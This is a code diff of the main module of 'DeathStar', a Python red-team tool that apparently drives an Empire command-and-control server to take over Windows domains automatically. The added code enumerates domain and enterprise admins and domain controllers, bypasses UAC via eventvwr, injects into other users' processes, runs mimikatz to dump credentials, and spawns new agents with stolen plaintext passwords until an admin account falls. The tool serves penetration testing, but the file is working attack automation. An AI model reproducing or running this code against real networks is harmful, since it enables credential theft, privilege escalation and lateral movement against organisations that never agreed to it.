@@ -23,9 +23,11 @@ __version__ = "2.0"
 import logging
 import argparse
 import asyncio
+from collections import Counter
 from deathstar.kybercrystals import KyberCrystals
+from deathstar.planetaryrecon import PlanetaryRecon
 from deathstar.empire import EmpireApiClient, EmpireLoginError
-from deathstar.utils import CustomArgFormatter
+from deathstar.utils import CustomArgFormatter, beautify_json
 
 handler = logging.StreamHandler()
 handler.setFormatter(logging.Formatter("[%(name)s] %(levelname)s - %(message)s"))
@@ -38,85 +40,155 @@ log.addHandler(handler)
 class DeathStar:
     def __init__(self, empire):
         self.empire = empire
-
-        self.enterprise_admins = []
-        self.admins = []
-        self.domain_controllers = []
         self.priority_targets = []
 
-        self.fire_missions = []
-        self.won = asyncio.Event()
-        self.recon_performed = asyncio.Event()
-
+        self.recon = PlanetaryRecon()
         self.kybers = KyberCrystals(self)
+        self.won = asyncio.Event()
 
-    async def agent_running_under_domain_account(self, agent):
-        agent = await self.empire.agents.get(agent)
-        host = agent["hostname"]
-        domain, user = agent["username"].split("\\")
+    async def planetary_recon(self):
+        log.debug("Recon task started")
 
-        if domain != host and user != "SYSTEM":
-            return True
-        return False
-
-    async def recon(self, agent):
-        if await self.agent_running_under_domain_account(agent):
-            log.info("Starting recon")
-
-        domain_sid = await self.kybers.get_domain_sid(agent)[0]
-        domain_admins, enterprise_admins = await asyncio.gather(
-            *[
-                self.kybers.get_group_members(domain_sid + "-512"),
-                self.kybers.get_group_members(domain_sid + "-519"),
-            ]
-        )
-
-        self.recon_performed.set()
-
-    async def fire(self, agent):
-        await self.recon_performed.wait()
-
-    async def poll_for_agents(self):
-        while not self.won.is_set():
-            agents = await self.empire.agents.get()
-            for agent in agents:
-                if not any(
-                    map(lambda t: t.get_name() == agent["name"], self.fire_missions)
-                ):
-                    asyncio.create_task(self.fire(agent), name=agent["name"])
-
-            asyncio.sleep(1)
-
-        await asyncio.gather(*self.fire_missions)
-
-    async def check_for_win(self):
         while not self.won.is_set():
             for agent in await self.empire.agents.get():
-                if agent["username"] in self.admins and agent["high_integrity"]:
+                if agent.domain and not self.recon.has_been_performed(agent.domain):
+                    log.info(f"{agent.name} => Starting recon on domain '{agent.domain}'")
+
+                    domain_sid = await self.kybers.get_domain_sid(agent)
+                    domain_admins, enterprise_admins, domain_controllers = await asyncio.gather(*[
+                        self.kybers.get_group_member(agent, domain_sid + "-512"),
+                        self.kybers.get_group_member(agent, domain_sid + "-519"),
+                        self.kybers.get_domain_controller(agent)
+                    ])
+
+                    self.recon.data[agent.domain]["domain_sid"] = domain_sid
+                    self.recon.data[agent.domain]["domain_admins"] = domain_admins
+                    self.recon.data[agent.domain]["enterprise_admins"] = enterprise_admins
+                    self.recon.data[agent.domain]["domain_controllers"] = domain_controllers
+
+                    log.info(f"{agent.name} => Recon complete for domain '{agent.domain}'")
+                    #log.debug("Recon data:" + beautify_json(self.recon.data[agent.domain]))
+
+                    self.recon.set_performed(agent.domain)
+
+            await asyncio.sleep(3)
+
+    async def galaxy_conquest(self, agent):
+        log.debug(f"{agent.name} => It's wabbit season, hunting for them admins")
+
+        local_admin_access, admin_sessions = asyncio.gather(*[
+            self.kybers.find_localadmin_access(agent),
+            self.kybers.user_hunter(agent)
+        ])
+
+        ## Spread here
+
+    async def fire_mission(self, agent):
+        seen_usernames = []
+
+        await self.recon.event(agent.domain).wait()
+        log.debug(f"{agent.name} => Starting fire mission")
+
+        if not agent.high_integrity:
+            self.kybers.bypassuac_eventvwr(agent)
+
+        while not self.won.is_set():
+            for entry in await self.kybers.get_loggedon(agent):
+                username = f"{entry['LogonDomain']}\\{entry['UserName']}"
+                if username in self.recon.all_admins and username not in seen_usernames:
+                    log.info(f"{agent.name} => Admin {username} is logged into {agent.hostname}")
+                    self.priority_targets.append(agent.hostname)
+
+            if agent.high_integrity:
+                for process in await self.kybers.tasklist(agent):
+                    if process["UserName"] and process["UserName"] != agent.username and process["UserName"] not in seen_usernames:
+                        log.info(f"{agent.name} => Found process '{process['ProcessName']}' (pid: {process['PID']}) running under {process['UserName']}")
+                        await self.kybers.psinject(agent, process)
+                        continue
+
+                await self.kybers.mimikatz(agent)
+
+            await asyncio.sleep(10)
+
+    async def agent_poller(self):
+        log.debug("Agent poller started")
+        missions = []
+
+        while not self.won.is_set():
+            for agent in await self.empire.agents.get():
+                if not any(
+                    map(lambda task: task.get_name() == agent.name, missions)
+                ):
+                    missions.extend([
+                        asyncio.create_task(self.fire_mission(agent), name=agent.name),
+                        asyncio.create_task(self.galaxy_conquest(agent), name=agent.name)
+                    ])
+
+            await asyncio.sleep(3)
+
+        await asyncio.gather(*missions)
+
+    async def agent_spawner(self):
+        log.debug("Agent spawner started")
+
+        while not self.won.is_set():
+            plaintext_creds = filter(
+                lambda c: c.credtype == "plaintext",
+                await self.empire.credentials.get()
+            )
+
+            for cred in plaintext_creds:
+                agents = await self.empire.agents.get()
+                if agents:
+                    if not any(filter(lambda a: a.domain == cred.domain and a.username == cred.username, agents)):
+                        # Count hostnames for all agents
+                        pwned_computers = Counter(map(lambda a: a.hostname, agents))
+
+                        # Get the hostname with the least amount of occurances
+                        least_pwned = list(sorted(pwned_computers.items(), key=lambda h: h[1]))[0]
+
+                        # Get the agents on that machine
+                        agent = list(filter(lambda a: a.hostname == least_pwned, agents))[0]
+
+                        log.info(f"Spawning agent on '{least_pwned}' with creds for {cred.pretty_username} as it has the least amount of agents")
+                        await self.kybers.spawnas(agent, cred_id=cred.id)
+
+            await asyncio.sleep(3)
+ 
+    async def win_checker(self):
+        log.debug("Win checker started")
+
+        while not self.won.is_set():
+            for agent in await self.empire.agents.get():
+                if agent.username in self.recon.all_admins and agent.high_integrity:
                     self.won.set()
 
             for cred in await self.empire.credentials.get():
-                if cred["credtype"] == "plaintext":
-                    account = f"{cred['domain'].upper()}\\{cred['username']}"
-                    if account in self.admins:
-                        self.won.is_set()
+                if cred.credtype in ["plaintext", "hash"] and cred.pretty_username in self.recon.all_admins:
+                    self.won.is_set()
 
-            asyncio.sleep(1)
+            await asyncio.sleep(3)
 
     async def power_up(self):
         if "error" in await self.empire.listeners.get("DeathStar"):
             await self.empire.listeners.create(additional={"Port": 8443})
 
-        await asyncio.gather(*[self.check_for_win(), self.poll_for_agents()])
-
+        await asyncio.gather(*[
+            self.planetary_recon(),
+            self.win_checker(),
+            self.agent_spawner(),
+            self.agent_poller(),
+        ])
 
 async def main(args):
     try:
         empire = EmpireApiClient(host=args.api_host, port=args.api_port)
         await empire.login(args.username, args.password)
+        log.info("Empire login successful")
     except EmpireLoginError:
         log.error("Error logging into Empire, invalid credentials?")
     else:
+        log.info("Powering up the DeathStar and waiting for agents")
         deathstar = DeathStar(empire)
         await deathstar.power_up()
 
